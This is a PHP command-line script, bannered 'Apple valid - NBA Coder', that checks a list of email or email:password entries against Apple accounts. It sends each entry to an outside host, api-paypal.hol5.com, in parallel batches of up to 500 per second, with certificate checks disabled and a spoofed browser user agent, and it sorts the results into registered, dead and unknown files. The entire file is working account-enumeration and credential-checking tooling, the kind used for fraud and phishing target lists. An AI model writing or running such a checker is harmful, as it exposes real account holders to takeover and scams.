<?php
ob_implicit_flush();
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));
define("API", "http://api-paypal.hol5.com/api.php" , "http://api-paypal.hol5.com/api2.php");

echo banner();

enterlist:
$listname = readline(" Input your file list? ");
if(empty($listname) || !file_exists($listname)) {
	echo" * not found!".PHP_EOL;
	goto enterlist;
}
$lists = file_get_contents($listname);
$lists = explode("\n", str_replace("\r", "", $lists));
$lists = array_unique($lists);
$delim = readline(" delim (fill if the list type is empas)? ");
$delim = empty($delim) ? false : $delim;
$savetodir = readline(" save to dir (default: valid)? ");
$savetodir = empty($savetodir) ? "valid" : $savetodir;
if(!is_dir($savetodir)) mkdir($savetodir);
chdir($savetodir);
sendemail:
$ratio = readline(" send email per second (max: 500)? ");
$ratio = (empty($ratio) || !is_numeric($ratio) || $ratio <= 0) ? 2 : $ratio;
if($ratio > 500) {
	echo " * max 500".PHP_EOL;
	goto sendemail;
}
$delpercheck = readline(" delete list per check (y/n)? ");
$delpercheck = strtolower($delpercheck) == "y" ? true : false;
$no = 0; $total = count($lists); $registered = 0; $die = 0; $limited = 0;
$lists = array_chunk($lists, $ratio);
echo PHP_EOL;

foreach($lists as $clist) {
	$array = $ch = array();
	$mh = curl_multi_init();
	foreach($clist as $i => $list) {
		$no++;
		$email = $list;
		if(empty($email)) continue;
		$array[$i]["no"] = $no;
		$array[$i]["list"] = $list;
		$array[$i]["email"] = $email;
        $urlindexnya = array("apple1","apple2","apple3","apple4","apple5");
        $urlindexrand = rand(0,4);
		$ch[$i] = curl_init();
		curl_setopt($ch[$i], CURLOPT_URL, 'http://api-paypal.hol5.com/apple/'.$urlindexnya[$urlindexrand].'/check.php?mailpass='.$email);
		curl_setopt($ch[$i], CURLOPT_ENCODING, "");
		curl_setopt($ch[$i], CURLOPT_POST, 0);
		curl_setopt($ch[$i], CURLOPT_HEADER, 1);
		curl_setopt($ch[$i], CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch[$i], CURLOPT_COOKIESESSION, 1);
		curl_setopt($ch[$i], CURLOPT_COOKIEJAR, "cookie.txt");
		curl_setopt($ch[$i], CURLOPT_COOKIEFILE, "cookie.txt");
		curl_setopt($ch[$i], CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch[$i], CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36");
		curl_multi_add_handle($mh, $ch[$i]);
	}
	$active = null;
	do {
		curl_multi_exec($mh, $active);
	} while($active > 0);
	foreach($ch as $i => $c) {
		$no =  $array[$i]["no"];
		$list =  $array[$i]["list"];
		$email =  $array[$i]["email"];
		$respon = curl_multi_getcontent($c);
		$x = $respon;
		if($x != "") {
			if(strpos($x, "DIE")) {
				$die++;
				file_put_contents("die.txt", $list.PHP_EOL, FILE_APPEND);
				echo " [".$no."/".$total."][".date("H:i:s")."] ".$email." => ".color()["LR"]."Not Registered";
			}else if(strpos($x, "UNCHECK")) {
				$limited++;
				file_put_contents("unkown.txt", $list.PHP_EOL, FILE_APPEND);
				echo " [".$no."/".$total."][".date("H:i:s")."] ".$email." => ".color()["BR"]."Uncheck !";
			}else if(strpos($x, "LIVE")) {
				$registered++;
				file_put_contents("registered.txt", $list.PHP_EOL, FILE_APPEND);
				echo " [".$no."/".$total."][".date("H:i:s")."] ".$email." => ".color()["LG"]."Registered";
			}
		}else{
			die("Failed to connect server !");
		}
		if($delpercheck) {
    		$awal = str_replace("\r", "", file_get_contents("../".$listname));
    	   	$akhir = str_replace($list."\n", "", $awal);
    	   	if($no == $total) $akhir = str_replace($list, "", $awal);
    	    file_put_contents("../".$listname, $akhir);
    	}
		echo PHP_EOL;
		curl_multi_remove_handle($mh, $c);
		usleep(7000);
	}
	curl_multi_close($mh);
}
if(empty(file_get_contents("../".$listname))) unlink("../".$listname);
echo PHP_EOL." Total [ ".$total." ] Registered - [ ".$registered." ] Not Registered - [ ".$die." ] - Unknown [ ".$limited." ] ".PHP_EOL." saved to dir \"".$savetodir."\"".PHP_EOL;

function banner() {
	$out = color()["LW"]."---------------------------------------------------
   Apple valid - NBA Coder
---------------------------------------------------".color()["WH"].PHP_EOL;
	return $out;
}
function get_str($str, $strt, $end) {
	$str = explode($strt, $str);
	$str = explode($end, $str[1]);
	return $str[0];
}
function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : ""),
        "BR" => (OS == "linux" ? "\e[1;44m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33;40m" : "")
	);
}
